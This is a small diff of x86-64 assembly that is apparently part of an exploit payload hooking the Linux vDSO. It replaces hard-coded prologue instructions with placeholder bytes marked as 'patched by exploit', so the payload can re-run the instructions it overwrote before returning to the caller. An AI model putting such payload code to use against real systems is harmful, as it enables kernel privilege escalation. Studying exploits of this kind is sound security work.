@@ -57,11 +57,8 @@ _start:
 exit:
 		;; get callee address (pushed on the stack by the call instruction)
 		pop     rax
-		;; execute missed instructions
-		;; XXX: not stable across different vDSO versions
-		push    rbp
-		mov     rbp, rsp
-		lfence
+		;; execute missed instructions (patched by exploit)
+		db	0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef
 		;; return to callee
 		jmp     rax
 
